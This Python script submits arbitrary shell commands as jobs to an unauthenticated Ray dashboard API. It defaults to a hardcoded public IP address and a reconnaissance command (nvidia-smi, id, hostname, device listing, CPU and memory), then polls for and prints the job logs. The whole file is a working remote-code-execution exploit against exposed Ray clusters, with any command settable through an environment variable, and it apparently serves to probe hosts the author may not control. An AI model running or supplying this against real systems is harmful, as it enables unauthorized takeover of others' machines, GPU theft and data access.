#!/usr/bin/env python3
"""Ray dashboard job submission from runner vantage (no auth expected).
usage: RAY_HOST=1.2.3.4:8265 python3 vantage/ray.py
Env: CMD (entrypoint), SID (submission id)
"""
import json, os, ssl, sys, time, urllib.request, urllib.error

HOST = os.environ.get("RAY_HOST", "24.165.187.21:8265")
CMD = os.environ.get("CMD", "nvidia-smi -L; id; hostname; ls -l /dev/nvidia* 2>/dev/null; nproc; free -g | head -2")
SID = os.environ.get("SID", "ul-probe-%d" % int(time.time()))
BASE = "http://%s" % HOST


def req(method, path, body=None, timeout=30):
    url = BASE + path
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, method=method,
                               headers={"Content-Type": "application/json", "Accept": "application/json"})
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            raw = resp.read()
            return resp.status, raw[:200000].decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read()[:4000].decode("utf-8", "replace")
    except Exception as e:
        return -1, type(e).__name__ + ":" + str(e)[:200]


def main():
    print("== version ==", req("GET", "/api/version"))
    print("== cluster_status ==", req("GET", "/api/cluster_status")[0])
    body = {"entrypoint": CMD, "submission_id": SID,
            "runtime_env": {"env_vars": {"UL": "1"}},
            "entrypoint_num_cpus": 0.1, "entrypoint_num_gpus": 0}
    st, txt = req("POST", "/api/jobs/", body)
    print("== submit ==", st, txt[:500])
    for i in range(20):
        time.sleep(4)
        st, txt = req("GET", "/api/jobs/%s" % SID)
        print("== status[%d] ==" % i, st, txt[:300].replace("\n", " "))
        if '"status": "SUCCEEDED"' in txt or '"status": "FAILED"' in txt or '"status":"SUCCEEDED"' in txt:
            break
    for p in ("/api/jobs/%s/logs" % SID, "/api/jobs/%s" % SID):
        st, txt = req("GET", p)
        print("== %s ==" % p, st)
        print(txt[:6000])


if __name__ == "__main__":
    main()
